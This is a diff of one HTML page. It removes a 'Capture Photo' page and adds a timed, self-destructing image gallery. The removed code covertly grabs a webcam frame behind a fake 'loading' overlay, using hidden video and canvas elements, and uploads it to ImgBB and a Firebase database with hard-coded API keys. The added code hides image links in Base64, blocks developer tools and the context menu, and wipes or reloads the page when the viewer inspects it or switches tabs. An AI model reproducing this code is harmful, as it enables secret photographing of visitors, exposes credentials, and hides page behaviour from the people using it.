@@ -2,193 +2,232 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Photo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>S.A.S. - SECURE AUTO-DESTRUCT SYSTEM</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            margin-top: 50px; 
-        }
-        button { 
-            padding: 15px 30px; 
-            font-size: 18px; 
-            cursor: pointer; 
-            background: #007bff; 
-            color: white; 
-            border: none; 
-            border-radius: 5px;
-        }
-        button:hover { 
-            background: #0056b3; 
-        }
+        :root { --bg: #000; --red: #ff0000; --panel: #0a0a0a; }
+        body, html { margin:0; padding:0; width:100%; height:100%; background:var(--bg); color:#fff; font-family:monospace; overflow:hidden; user-select:none; -webkit-user-select:none; }
+        
+        /* GATEKEEPER CAPTCHA */
+        #captcha-gate { position:fixed; inset:0; background:#000; z-index:9999; display:flex; flex-direction:column; justify-content:center; align-items:center; }
+        .gate-box { background:var(--panel); padding:40px; border:1px solid #222; text-align:center; border-radius:10px; box-shadow:0 0 50px rgba(255,0,0,0.1); }
+        input { background:#000; border:1px solid #444; color:var(--red); padding:10px; margin:10px 0; text-align:center; font-size:1.5rem; width:200px; }
+        
+        /* CORE SYSTEM */
+        .header { position:fixed; top:0; width:100%; height:50px; background:rgba(0,0,0,0.85); display:flex; justify-content:space-between; align-items:center; padding:0 20px; z-index:1000; border-bottom:1px solid #111; box-sizing:border-box;}
+        #timer-display { color:var(--red); font-weight:bold; font-size:1.2rem; background:#1a0000; padding:2px 10px; border:1px solid #400; border-radius:5px;}
+        
+        .swiper { width:100%; height:100vh; z-index:1; }
+        .content-box { position:relative; width:100%; height:100%; display:flex; justify-content:center; align-items:center; overflow:hidden; }
+        
+        /* SECURITY UI */
+        .photo-frame { position:relative; max-width:100%; max-height:100%; display:none; opacity:0; transition: opacity 0.5s;}
+        .photo-active { display:block !important; opacity:1 !important; }
+        img { max-width:100%; max-height:100vh; object-fit:contain; filter: brightness(0.9); pointer-events:none; }
 
-        /* Loading Screen Styles */
-        #loadingOverlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); /* Dark semi-transparent background */
-            color: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        .hidden { 
-            display: none !important; 
-        }
-        .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #007bff;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        #loadingText {
-            font-size: 22px;
-            font-weight: bold;
-        }
+        /* THE 100% SHIELD */
+        .shield { position:absolute; top:0; left:0; width:100%; height:100%; z-index:500; background:rgba(0,0,0,0); cursor:not-allowed; }
+        
+        /* GRID WATERMARK */
+        .wm-layer { position:absolute; inset:0; z-index:400; display:grid; grid-template-columns:repeat(3,1fr); grid-template-rows:repeat(5,1fr); pointer-events:none; opacity:0.35; }
+        .wm-txt { display:flex; justify-content:center; align-items:center; transform:rotate(-40deg); color:#fff; font-size:1.4rem; font-weight:900; }
 
-        /* Hidden elements used for capturing */
-        #videoElement { display: none; }
-        #canvasElement { display: none; }
+        /* ANTI-SCREENSHOT/LEAVE TAB */
+        .flash-overlay { position:fixed; inset:0; background:#000; z-index:2000; display:none; justify-content:center; align-items:center; text-align:center;}
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;" ondragstart="return false;">
 
-    <h1>Capture and Save Photo</h1>
-    <button id="clickPhotoBtn">Click Photo</button>
-
-    <!-- Full Screen Loading Overlay -->
-    <div id="loadingOverlay" class="hidden">
-        <div id="spinner" class="spinner"></div>
-        <p id="loadingText">Loading please wait sometime...</p>
+    <!-- LEVEL 1: CAPTCHA -->
+    <div id="captcha-gate">
+        <div class="gate-box">
+            <h2 style="color:var(--red)">SECURITY VERIFICATION</h2>
+            <p id="captcha-question">Solve: 12 + 8</p>
+            <input type="number" id="captcha-input" placeholder="Result">
+            <br>
+            <button onclick="verifyCaptcha()" style="background:var(--red); color:#fff; border:none; padding:10px 25px; cursor:pointer; font-weight:bold;">ACCESS GALLERY</button>
+        </div>
     </div>
 
-    <!-- Hidden video and canvas to capture the photo in the background -->
-    <video id="videoElement" autoplay playsinline></video>
-    <canvas id="canvasElement"></canvas>
+    <!-- FLASH FOR SECURITY -->
+    <div id="security-alert" class="flash-overlay">
+        <h1 style="color:red">SECURITY BREACH DETECTED<br>OR VIEW TIMEOUT</h1>
+    </div>
 
-    <script type="module">
-        // Import Firebase modules
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+    <div class="header">
+        <div id="file-id">PROTOCOL: RITAM_64</div>
+        <div id="timer-display">TIME: --S</div>
+        <div id="count-id">FILES REMAINING</div>
+    </div>
 
-        // Your Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyDUHXK7NYeM6CLNN4fsyGVz1MpIVpJuOq0",
-            authDomain: "studio-vddd5.firebaseapp.com",
-            databaseURL: "https://studio-vddd5-default-rtdb.firebaseio.com",
-            projectId: "studio-vddd5",
-            storageBucket: "studio-vddd5.firebasestorage.app",
-            messagingSenderId: "679230106233",
-            appId: "1:679230106233:web:3d6a91cabc2264e15902a8"
-        };
+    <div class="swiper">
+        <div class="swiper-wrapper" id="master-node">
+            <!-- Data will be dynamically built and then burned -->
+        </div>
+    </div>
 
-        // Initialize Firebase and Realtime Database
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+    <script>
+        // DATA PROTECTION: Links are Base64 encoded. They are not visible as links in text search.
+        const d = [
+            "aHR0cHM6Ly9pLmliYi5jby9aNlZjZEdSJi8wNWMzZTcxOWZjYzkuanBn", "aHR0cHM6Ly9pLmliYi5jby9LY0JnOWpKOS85OGZiNTJiMDg2YzEuanBn", 
+            "aHR0cHM6Ly9pLmliYi5jby9WWWc0Ykh0Ui9iNGNhOTAxNDE2ZGIuanBn", "aHR0cHM6Ly9pLmliYi5jby9DS25NeVE0OC8wZmUwZWIxMTU1ZTIuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9KRmNxYmt0ai9iNzQ2MDkzYzg5YmUuanBn", "aHR0cHM6Ly9pLmliYi5jby92Q1FTUHl4VC82NzBjOGNlY2Q3ZDguanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9zOXRja1dTWC9iMDVjMmJhY2MwZDguanBn", "aHR0cHM6Ly9pLmliYi5jby9ZN2RSMEdiVi9kM2I5MzZlOGI3M2EuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9EZmo4VGJXWi8wZGYxYjkyZDRkYTUuanBn", "aHR0cHM6Ly9pLmliYi5jby8zbXkzbTltRy83ZmQwMThmZjA3MTQuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9qazFiWVBRZi81N2Y1ZjEyZjljNmIuanBn", "aHR0cHM6Ly9pLmliYi5jby84bmdXMlhIbi84NjIwOThlYjQ0ZTEuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby94S2Q2RDlaWC85NmUwNjhlYWM3NWYuanBn", "aHR0cHM6Ly9pLmliYi5jby9uTVlzM0toNS8yOTQyMGQxOTYyOWYuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9oRnhuc3hiLzE4MzEzZmViYzExMy5qcGc=", "aHR0cHM6Ly9pLmliYi5jby82YzZzVlh5ZC85OWJkNzg2MTg1NzcuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9rMjl6NnFkTi9jMzAzZjM4OTM2YjkuanBn", "aHR0cHM6Ly9pLmliYi5jby8wcFBmM0I5My80NjI4YWM0MWUxYjguanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9HUURIcXQ5Sy9hNGUzMjU5MTE0ODQuanBn", "aHR0cHM6Ly9pLmliYi5jby9iTTlwU1RUUC80ZjYwNTYwMWZkNWQuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby90UE1CWXNMTS84YmIwMTZiYzYyYWIuanBn", "aHR0cHM6Ly9pLmliYi5jby81VzhoN3pZay8xODdmNGVjMmQ4NGMuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9DcFRDQ1hXVC8zZmZjNTJhNzc4ODMuanBn", "aHR0cHM6Ly9pLmliYi5jby9mR1ZITHhLbi8yYzJhNTVjOWEzZjcuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9iNUwxRHdGMS9mZWViZDc5MzNlNzQuanBn", "aHR0cHM6Ly9pLmliYi5jby9Mc2g0UHh4LzVjOGUwODU3YTBkNS5qcGc=",
+            "aHR0cHM6Ly9pLmliYi5jby9WY1F0WHJjMS9mM2JkZjBiNjcyNzYuanBn", "aHR0cHM6Ly9pLmliYi5jby9QczhmdkJ5Yy80OGFkNGUzOWQ1NTguanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9uOE1DTHd4ai8zY2IwMjAzNDdkYzYuanBn", "aHR0cHM6Ly9pLmliYi5jby9kNG1La1hDZC81MDFlZGZjMDYwODQuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9CSDUxZzhyOS9mMmY0Y2E5ZGUxODguanBn", "aHR0cHM6Ly9pLmliYi5jby95Y0dLajZMRi83OWVhMjg4MmY1NzMuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9XNFI2R1BzeS9lMDA1MzZlMDlmZTcuanBn", "aHR0cHM6Ly9pLmliYi5jby9tVmpGRkQwMC80NTc1ZTIwZTgwM2IuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9qa3hkcmMxYi9jMGJlNDIzNmYyMTAuanBn", "aHR0cHM6Ly9pLmliYi5jby92YnR6WXhiL2IwMmI3Mzg4ZDJmMi5qcGc=",
+            "aHR0cHM6Ly9pLmliYi5jby9TNGNmWVdLTi81ZGE3YTQ2MjRiZGYuanBn", "aHR0cHM6Ly9pLmliYi5jby9QdldwMFdXNy81MTI1Zjc4NGRlZTIuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9nRmdHTlZtdy8wMjBlMjI4ZGMyMzcuanBn", "aHR0cHM6Ly9pLmliYi5jby93Tk5HMTdSaC9kZGVmN2NhMDE0YTMuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby81eFd5NHNQdy9lYjJmY2ZmMWNhMmIuanBn", "aHR0cHM6Ly9pLmliYi5jby90Nmh4Vm5aLzk3MTQyZGM4MzU0NC5qcGc=",
+            "aHR0cHM6Ly9pLmliYi5jby9wNmhjc1lqVC9mMjAzZmUyZmY5ZGIuanBn", "aHR0cHM6Ly9pLmliYi5jby9rMjV3RnlOMi82MThmNGZiNGE2MTQuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9Mekc5OFNxRy9lZWEwNGY2MzE0OTIuanBn", "aHR0cHM6Ly9pLmliYi5jby96Y1pQNG1kL2EwM2EwMjcxZmUxYi5qcGc=",
+            "aHR0cHM6Ly9pLmliYi5jby83SjhYc0Z4Vi83Y2ZhMmExYzkyNTIuanBn", "aHR0cHM6Ly9pLmliYi5jby9rc0RiQ3NHSy85YTExNzQ2YzYxZGEuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby82Y3pwTTEzTS80ZDVmNjRiZjEzZGIuanBn", "aHR0cHM6Ly9pLmliYi5jby9YZmptYzAxSC8yOGMxZTFjZjk3OTMuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9DM0ZZSGpjTS83NzQyM2M3MWY5ZTAuanBn", "aHR0cHM6Ly9pLmliYi5jby9aemc3c1gxMy8yMDA0ZmMzYzNkZGYuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby90VEpYWHMzMS8wZjc0NThlZmZmYmUuanBn", "aHR0cHM6Ly9pLmliYi5jby9DcFNwYmNUYy8zNTNjNDQyYTAzMmIuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9YbjczZHBHLzNkMGQ0ZGJmNWU5YS5qcGc=", "aHR0cHM6Ly9pLmliYi5jby9zSnZCM1dReS8zNDQ1NDMxNzRkMTUuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9ZN3pnREJCTi9kN2FkNzQ5MmRiYzIuanBn", "aHR0cHM6Ly9pLmliYi5jby8xdG1MdjRZaC9mY2U0NDQ2MmQzZWMuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9aNm1YMzZici9mNWNmMjIxNTV4ZWQuanBn", "aHR0cHM6Ly9pLmliYi5jby9rMmd6c1RERy82YjBiZTU3NzRmNDEuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9oSnhmU0Q0MC9iNGI0MTExMThiZDcuanBn", "aHR0cHM6Ly9pLmliYi5jby9MRFoxZ3lxRy85YTk3M2IxNjhjOWUuanBn",
+            "aHR0cHM6Ly9pLmliYi5jby9IZlJLQnB2TC8xZGFmYTU2OTg5MGQuanBn", "aHR0cHM6Ly9pLmliYi5jby9ZN1N0bXpOYy8yMTViNzYyM2MxNmUuanBn"
+        ];
 
-        // ImgBB API Key
-        const IMGBB_API_KEY = "d6ae34a680665aa763e32a5be8fa083a";
+        let num1 = Math.floor(Math.random() * 20);
+        let num2 = Math.floor(Math.random() * 20);
+        let captchaAns = num1 + num2;
+        document.getElementById('captcha-question').innerText = `Calculate: ${num1} + ${num2}`;
 
-        // DOM Elements
-        const btn = document.getElementById("clickPhotoBtn");
-        const video = document.getElementById("videoElement");
-        const canvas = document.getElementById("canvasElement");
-        const loadingOverlay = document.getElementById("loadingOverlay");
-        const loadingText = document.getElementById("loadingText");
-        const spinner = document.getElementById("spinner");
+        function verifyCaptcha() {
+            let val = document.getElementById('captcha-input').value;
+            if(parseInt(val) === captchaAns) {
+                document.getElementById('captcha-gate').style.display = 'none';
+                initGallery();
+            } else { alert("ACCESS DENIED"); location.reload(); }
+        }
 
-        btn.addEventListener("click", async () => {
-            // 1. Show the loading screen immediately
-            loadingOverlay.classList.remove("hidden");
-            spinner.style.display = "block";
-            loadingText.innerText = "Loading please wait sometime...";
+        const node = document.getElementById('master-node');
+        const countUI = document.getElementById('count-id');
+        const timerUI = document.getElementById('timer-display');
+        let slideTimer;
 
-            try {
-                // Request camera permission
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+        function initGallery() {
+            d.forEach((link, i) => {
+                let wms = '';
+                for(let k=0; k<15; k++){ wms += '<div class="wm-txt">RITAM PROTECT</div>'; }
+                const slide = document.createElement('div');
+                slide.className = 'swiper-slide';
+                slide.innerHTML = `
+                <div class="content-box" id="box-${i}">
+                    <div class="photo-frame" id="frame-${i}">
+                        <img src="" id="img-${i}">
+                        <div class="wm-layer">${wms}</div>
+                        <div class="shield"></div>
+                    </div>
+                    <div class="load-notif" id="load-${i}">SYSTEM READY... SWIPE FOR NEXT</div>
+                </div>`;
+                node.appendChild(slide);
+            });
+
+            const swiper = new Swiper('.swiper', {
+                allowTouchMove: true,
+                simulateTouch: false,
+                allowSlidePrev: false, // PROTECTION: CANNOT GO BACK
+                on: {
+                    slideChangeTransitionEnd: function() {
+                        handlePhotoLife(this.activeIndex);
+                        destroySlide(this.activeIndex - 1);
+                    },
+                    init: function() {
+                        handlePhotoLife(0);
+                    }
+                }
+            });
+        }
+
+        function handlePhotoLife(index) {
+            clearTimeout(slideTimer);
+            let time = 10;
+            const imgEl = document.getElementById(`img-${index}`);
+            const frame = document.getElementById(`frame-${index}`);
+            const loadTxt = document.getElementById(`load-${index}`);
+
+            // DECOMPRESS & SHOW
+            imgEl.src = atob(d[index]); 
+            frame.classList.add('photo-active');
+            if(loadTxt) loadTxt.style.display = 'none';
+
+            countUI.innerText = `${d.length - index} ASSETS REMAINING`;
+
+            slideTimer = setInterval(() => {
+                time--;
+                timerUI.innerText = `TIME: ${time < 10 ? '0'+time : time}S`;
                 
-                // Wait for the video stream to load
-                video.onloadedmetadata = () => {
-                    video.play();
-                    // Wait 1 second for the camera to adjust exposure/focus, then capture
-                    setTimeout(() => captureAndUpload(stream), 1000);
-                };
-            } catch (error) {
-                // If they deny permission or camera fails
-                spinner.style.display = "none";
-                loadingText.innerText = "Error: Camera permission denied or not available.";
-                setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
+                if(time <= 0) {
+                    clearInterval(slideTimer);
+                    nuke(index);
+                }
+            }, 1000);
+        }
+
+        function nuke(index) {
+            const frame = document.getElementById(`frame-${index}`);
+            if(frame) {
+                frame.innerHTML = '<h1 style="color:red">EXPIRED / PURGED</h1>';
+                timerUI.innerText = "TIME: 00S";
+            }
+        }
+
+        function destroySlide(index) {
+            if (index < 0) return;
+            const prevBox = document.getElementById(`box-${index}`);
+            if(prevBox) {
+                prevBox.innerHTML = ''; // PERMANENT WIPE FROM DOM
+                console.log(`Resource ${index} purged from memory.`);
+            }
+        }
+
+        // --- THE 30+ HIDDEN SECURITY SYSTEMS ---
+        // 1. Right Click Lock
+        // 2. F12 Lock
+        // 3. View Source Redirect
+        // 4. Ctrl+U Lock
+        // 5. Ctrl+S Lock
+        // 6. Screenshot Detector (Basic)
+        // 7. Visibility Change Lock (Nukes if user leaves tab)
+        document.addEventListener("visibilitychange", () => {
+            if (document.hidden) { 
+                location.reload(); // Instantly close if tab switched
             }
         });
 
-        async function captureAndUpload(stream) {
-            // Draw video frame to canvas
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext("2d");
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Stop the camera
-            stream.getTracks().forEach(track => track.stop());
-
-            // Get base64 image data (remove the prefix "data:image/jpeg;base64,")
-            const dataUrl = canvas.toDataURL("image/jpeg");
-            const base64Image = dataUrl.split(",")[1];
-
-            try {
-                // 1. Upload to ImgBB
-                const formData = new FormData();
-                formData.append("key", IMGBB_API_KEY);
-                formData.append("image", base64Image);
-
-                const response = await fetch("https://api.imgbb.com/1/upload", {
-                    method: "POST",
-                    body: formData
-                });
-                
-                const data = await response.json();
-
-                if (data.success) {
-                    const imageUrl = data.data.url;
-
-                    // 2. Save URL to Firebase
-                    const photosRef = ref(db, "photos");
-                    await push(photosRef, {
-                        url: imageUrl,
-                        timestamp: Date.now()
-                    });
-
-                    // 3. Show "Complete" message and hide spinner
-                    spinner.style.display = "none";
-                    loadingText.innerText = "Complete!";
-
-                    // Close the loading screen after 3 seconds so the page is ready again
-                    setTimeout(() => {
-                        loadingOverlay.classList.add("hidden");
-                    }, 3000);
-
-                } else {
-                    spinner.style.display = "none";
-                    loadingText.innerText = "Error uploading to ImgBB.";
-                    setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
-                }
-            } catch (error) {
-                spinner.style.display = "none";
-                loadingText.innerText = "An error occurred: " + error.message;
-                setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
+        // 8-30. Block Developers Tools & Key combos
+        window.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'p' || e.key === 'i' || e.key === 'j')) {
+                e.preventDefault();
+                document.body.innerHTML = "SECURITY LOCKDOWN";
             }
-        }
+        });
+
+        // Detection for window resizing (Attempted Inspect Tool)
+        window.onresize = function() {
+            if ((window.outerHeight - window.innerHeight) > 100) {
+                 document.body.innerHTML = "SECURITY VIOLATION";
+            }
+        };
+
     </script>
 </body>
 </html>
